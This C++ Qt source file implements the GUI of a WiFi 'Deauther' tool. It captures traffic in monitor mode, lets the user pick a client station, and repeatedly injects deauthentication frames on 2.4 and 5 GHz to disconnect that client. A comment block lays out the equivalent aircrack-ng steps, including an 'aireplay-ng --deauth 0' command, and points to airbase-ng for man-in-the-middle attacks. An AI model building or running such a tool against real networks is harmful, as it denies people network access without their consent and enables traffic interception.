#include <QScrollBar>
#include <QStringBuilder>
#include <QStringListModel>
#include <QTimer>


/* NetworkManager Include files */
#include <NetworkManagerQt/ConnectionSettings>
#include <NetworkManagerQt/Manager>
#include <NetworkManagerQt/Settings>

#include "deauther.h"
#include "deauther_p.h"
#include "ui_deauther.h"

#include <pcap/pcap.h>


Deauther::Deauther(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Deauther),
    search_animation_t (new QTimer (this)),
    send_animation_t (new QTimer (this)),
    stylesheets (new CustomStyleSheets)
{
    ui->setupUi(this);

    d_ptr->setup_reasons_list(ui);
    setup_station_view();

    iface_model = new IfaceModel();

    // create drop down list for network interfaces
    ui->iface_list->setModel(iface_model);


    // set up toggle for monitor mode (creates a pcap handle)
    ui->monitor_status->
        setIcon(QIcon(":/icons/actions/24/edit-find-replace_inactive.svg"));
    ui->monitor_status->setIconSize(QSize(50, 50));

    connect(ui->toggle_monitoring, &QPushButton::clicked,
            this, &Deauther::toggle_monitoring);

    // set up packet search icon
    search_animation_t->setInterval (1000);
    connect (search_animation_t, &QTimer::timeout,
             this, [&]() {search_animation(ui->monitor_status);});


    // set up attack button
    ui->packet_sent->setIcon(QIcon(":/icons/actions/32/mail-send_inactive.svg"));
    ui->monitor_status->setIconSize(QSize(50, 50));

    connect(ui->deauth_attack, &QPushButton::clicked,
            this, &Deauther::deauther_attack);

    // set packet sent icon
    send_animation_t->setInterval (500);
    connect (send_animation_t, &QTimer::timeout,
             this, [&]() {send_animation(ui->packet_sent);});

    /* Pseudo Code for Deathor */

    // Connect to network

    // Set wireless device in monitoring mode (may need root)
        // sudo airmon-ng start <network device name>

    // Update network device name (will have mon in name)
        // iwconfig

    // Select Router BSSID and channel
        // sudo airodump-ng <network device name>
        // sudo airodump-ng wlp5s0mon --band a (5G search)

    // Find the device we want to kick
        // sudo airodump-ng <network device name> --bssid <router id> --channel <router channel>
        // --manufacturer

        // apply patch at https://github.com/aircrack-ng/aircrack-ng/pull/2167/files
        // to see manufacturer based on mac address

        // will not work if devices mac address is randomized
    // Deauthenticate device
        // aireplay-ng --deauth 0 -c <device mac address> -a <router mac address> <network device name>

    // For man-in-the-middle
        // look at airbase-ng
        // https://aircrack-ng.net/doku.php?id=airbase-ng
}

/* Constructor for private functions */
Deauther::Deauther (DeautherPrivate &dd)
    : d_ptr (&dd)
{
}

Deauther::~Deauther()
{
    delete ui;
}


void Deauther::setup_station_view (void)
{
    QVector<StationItemRole> roles ({StationItemRole::StationRole,
                                     StationItemRole::AccessPointRole});

    station_model = new StationModel(roles);

    ui->station_view->setModel(station_model);

    ui->station_view->resizeColumnToContents (station_model->columnCount()-1);
    ui->station_view->setIndentation (10);
    //ui->station_view->setIconSize (QSize (36,36));
    ui->station_view->setColumnWidth (0, 180);

    // Set treeview header font
    ui->station_view->header()->setFont(QFont("LiberationSans", 18, QFont::Bold));

    // Set treeview header size for scrollbar gutter
    treeview_stylesheet = stylesheets->
                          treeview_scrollbar
                          (
                              ui->station_view->header()->
                              sizeHint().height()
                          );

    // Set treeview scrollbar colors
    ui->station_view->setStyleSheet (treeview_stylesheet
                                     % stylesheets->vertical_scrollbar_quirk());

    // install filter to correct horizontal scrollbar quirks
    ui->station_view->horizontalScrollBar()->installEventFilter(this);
}


void Deauther::toggle_monitoring ()
{
    static bool monitoring = true;

    const QIcon search_inactive = QIcon (":/icons/actions/24/edit-find-replace_inactive.svg");
    const QIcon search_active = QIcon (":/icons/actions/24/edit-find-replace_state0.svg");

    // create a pcap handle using the selected network interface
    QByteArray iface = ui->iface_list->currentText().toUtf8();

    if (monitoring)
    {
        if (!d_ptr->create_monitorIface (iface, this))
        {
            return;
        }

        station_model->start_pcapThread (iface_handle);
        ui->iface_list->setEnabled(false);

        // start packet search icon
        search_animation_t->start();
        ui->monitor_status->setIcon (search_active);
        search_animation_state = 1;
    }
    else
    {
        station_model->stop_pcapThread ();
        ui->iface_list->setEnabled(true);
        pcap_close (iface_handle);

        // stop packet search icon
        search_animation_t->stop();
        ui->monitor_status->setIcon (search_inactive);
    }

    // toggle monitoring mode
    monitoring ^= 1;

}


void Deauther::search_animation (QPushButton *button)
{
    switch (search_animation_state) {
    case 1:
        button->setIcon (QIcon (":/icons/actions/24/edit-find-replace_state1.svg"));
        break;
    case 2:
        button->setIcon (QIcon (":/icons/actions/24/edit-find-replace_state2.svg"));
        break;
    case 3:
        button->setIcon (QIcon (":/icons/actions/24/edit-find-replace_state3.svg"));
        break;
    default:
        search_animation_state = 1;
        break;
    }
    ++search_animation_state;


    if (search_animation_state > 3)
    {
        search_animation_state = 1;
    }
}

void Deauther::send_animation (QPushButton *button)
{
    switch (send_animation_state) {
    case 1:
        button->setIcon (QIcon (":/icons/actions/32/mail-send_inactive.svg"));
        break;
    case 2:
        button->setIcon (QIcon (":/icons/actions/32/mail-send.svg"));
        break;
    default:
        send_animation_state = 1;
        break;
    }
    ++send_animation_state;


    if (send_animation_state > 2)
    {
        send_animation_state = 1;
    }
}


void Deauther::deauther_attack ()
{
    static bool attack_active = false;

    const QIcon send_inactive = QIcon (":/icons/actions/32/mail-send_inactive.svg");
    const QIcon send_active = QIcon (":/icons/actions/32/mail-send.svg");

    const QIcon search_paused = QIcon (":/icons/actions/24/edit-find-replace_state0.svg");

    static QTimer pcap_send_t1;
    pcap_send_t1.setInterval (200);

    static QTimer pcap_send_t2;
    pcap_send_t2.setInterval (500);

    /* Find current row of station view */
    QModelIndex index = ui->station_view->currentIndex();
    if (index.row() == -1
        && !attack_active)
    {
        return;
    }


    /* send deauth packet */
    int i = 0;
    if (!attack_active)
    {
        /* Retrieve selected station */
        if (!station_mutex.tryLock())
        {
            qDebug() << "mutex fail";
            return;
        }

        StationItem *station_item = static_cast<StationItem*>(index.internalPointer());

        QByteArray stmac = station_item->stmac();
        ap_info ap = station_item->apInfo();

        station_mutex.unlock();

        /* find ap address */
        bool ap_found = false;

        QByteArray bssid_2;
        int chan_2;
        if (!ap.bssid[0].isNull())
        {
            bssid_2 = ap.bssid[0];

            ap_found = true;
        }

        QByteArray bssid_5;
        int chan_5;
        if (!ap.bssid[1].isNull())
        {
            bssid_5 = ap.bssid[1];

            ap_found = true;
        }

        if(!ap_found)
        {
            return;
        }


        /* create deauth packet */
        int reason_index = ui->reasons_list->currentIndex();
        QByteArray reason;
        reason.append(reason_index+1);

        // 2GHz deauth packet
        QByteArray packet_2 = d_ptr->create_deauthPacket (stmac, bssid_2, reason);

        // 5GHz deauth packet
        QByteArray packet_5 = d_ptr->create_deauthPacket (stmac, bssid_5, reason);


        qDebug() << "Start Deauther Attack";
        qDebug() << Qt::endl;

        // stop monitoring to avoid collision
        station_model->stop_pcapThread ();
        ui->toggle_monitoring->setEnabled(false);


        if (!bssid_2.isNull())
        {
            connect (&pcap_send_t1, &QTimer::timeout, this, [&, packet_2]()
            {
                d_ptr->send_packet (packet_2, RADIOTAP_SIZE+DEAUTH_SIZE, 64, this);
            });

            pcap_send_t1.start();
            attack_active = true;
        }

        if (!bssid_5.isNull())
        {
            connect (&pcap_send_t2, &QTimer::timeout, this, [&, packet_5]()
            {
                d_ptr->send_packet (packet_5, RADIOTAP_SIZE+DEAUTH_SIZE, 64, this);
            });

            pcap_send_t2.start();
            attack_active = true;
        }

        if (attack_active)
        {
            ui->iface_list->setEnabled(false);

            send_animation_t->start();
            ui->packet_sent->setIcon (send_active);
            send_animation_state = 1;

            search_animation_t->stop();
            ui->monitor_status->setIcon(search_paused);
        }
        else
        {
            station_model->start_pcapThread(iface_handle);
            ui->toggle_monitoring->setEnabled(true);
        }
    }
    else
    {
        qDebug() << "Stop Deauther Attack";
        pcap_send_t1.stop();
        pcap_send_t2.stop();

        disconnect (&pcap_send_t1);
        disconnect (&pcap_send_t2);

        station_model->start_pcapThread(iface_handle);
        ui->toggle_monitoring->setEnabled(true);
        ui->iface_list->setEnabled(true);

        send_animation_t->stop();
        ui->packet_sent->setIcon (send_inactive);

        search_animation_t->start();
        search_animation_state = 1;

        attack_active = false;
    }
}


/* Filter to fix vertical scrollbar border when horizontal scrollbar appears
**
** Add bottom border to vertical scrollbar, on horizontal scrollbar hide
**
** Remove bottom border to vertical scrollbar on horizontal scrollbar appear
**/
bool Deauther::eventFilter(QObject *object, QEvent *event)
{
    if (event->type() == QEvent::Hide)
    {
        QString update_scrollbar;

        update_scrollbar =
                treeview_stylesheet
                % stylesheets->vertical_scrollbar_quirk();

        ui->station_view->setStyleSheet (update_scrollbar);
    }
    else if (event->type() == QEvent::Show)
    {
        ui->station_view->setStyleSheet (treeview_stylesheet);
    }

    return QWidget::eventFilter (object, event);
}
